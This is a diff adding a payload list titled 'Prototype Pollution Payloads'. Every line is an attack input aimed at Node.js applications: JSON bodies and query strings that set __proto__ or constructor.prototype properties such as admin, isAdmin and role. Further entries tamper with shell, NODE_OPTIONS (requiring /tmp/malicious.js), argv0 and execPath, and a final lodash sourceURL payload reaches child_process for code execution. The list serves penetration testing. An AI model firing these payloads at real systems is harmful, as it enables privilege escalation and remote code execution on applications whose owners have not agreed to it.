@@ -1,0 +1,38 @@
+# Prototype Pollution Payloads
+
+# JSON body payloads
+{"__proto__":{"admin":true}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"role":"admin"}}
+{"__proto__":{"verified":true}}
+{"__proto__":{"polluted":true}}
+
+# Constructor prototype
+{"constructor":{"prototype":{"admin":true}}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"constructor":{"prototype":{"role":"admin"}}}
+
+# Query string format
+__proto__[admin]=true
+__proto__[isAdmin]=true
+__proto__[role]=admin
+__proto__.admin=true
+__proto__.isAdmin=true
+
+constructor[prototype][admin]=true
+constructor[prototype][isAdmin]=true
+constructor.prototype.admin=true
+
+# Nested pollution
+{"__proto__":{"__proto__":{"admin":true}}}
+{"a":{"__proto__":{"admin":true}}}
+
+# Common vulnerable properties
+{"__proto__":{"shell":"/bin/bash"}}
+{"__proto__":{"NODE_OPTIONS":"--require /tmp/malicious.js"}}
+{"__proto__":{"env":{"NODE_OPTIONS":"--inspect"}}}
+{"__proto__":{"argv0":"/bin/bash"}}
+{"__proto__":{"execPath":"/bin/bash"}}
+
+# RCE via prototype pollution (lodash, etc.)
+{"__proto__":{"sourceURL":"\u000areturn this.process.mainModule.require('child_process')"}}
